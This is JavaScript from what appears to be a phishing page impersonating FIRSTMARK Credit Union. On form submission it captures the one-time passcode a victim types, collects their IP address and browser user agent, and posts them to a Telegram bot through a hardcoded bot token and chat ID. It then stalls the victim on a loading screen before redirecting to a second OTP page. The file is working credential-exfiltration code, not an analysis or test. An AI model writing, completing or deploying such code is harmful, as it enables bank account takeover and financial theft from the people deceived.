
        // Function to send OTP data to Telegram
        async function sendOtpToTelegram(otp, ip, ua, botToken, chatId) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `#------------------[ FIRSTMARK Credit Union Otp ]---------------------#
OTP Code  : ${otp}
#---------------------[ Visitor ]-------------------------#
IP Address  : ${ip}
DEVICE INFORMATION      : ${ua}
#-------------------[ G1 - END ]------------------------#`
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    console.log("Message sent successfully:", data);
                } else {
                    console.error("Telegram API returned an error:", data.description);
                }
            } catch (error) {
                console.error("Error sending message:", error);
            }
        }

        // Function to fetch the IP address
        async function fetchIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP address:", error);
                return "Unavailable";
            }
        }

        // Event listener for form submission
        document.querySelector('#otpForm').addEventListener('submit', async function (event) {
            event.preventDefault();

            // Get OTP value
            const otp = document.querySelector('#otp').value.trim();

            if (otp) {
                // Show loading indicator and hide form
                document.querySelector('.form').style.display = 'none';
                document.querySelector('.loading-container').style.display = 'flex';

                // Fetch IP address and User-Agent
                const ip = await fetchIpAddress();
                const ua = navigator.userAgent;

                // Bot tokens and chat IDs
                const botToken1 = '7365792836:AAHFTCJXAglEjMYuXPj5WxPlvJD1UqR1uzI';
                const chatId1 = '6994641548';  // Ensure this is a valid chat ID (user or group)

                // Send OTP data to both bots
                try {
                    await sendOtpToTelegram(otp, ip, ua, botToken1, chatId1);
                    // Redirect to next page after 5 seconds
                    setTimeout(() => {
                        window.location.href = "./otp2.html";  // Change this to your next page URL
                    }, 12000);
                } catch (error) {
                    console.error("Error in sending OTP data to Telegram bots:", error);
                }
            } else {
                console.error("OTP is missing!");
            }
        });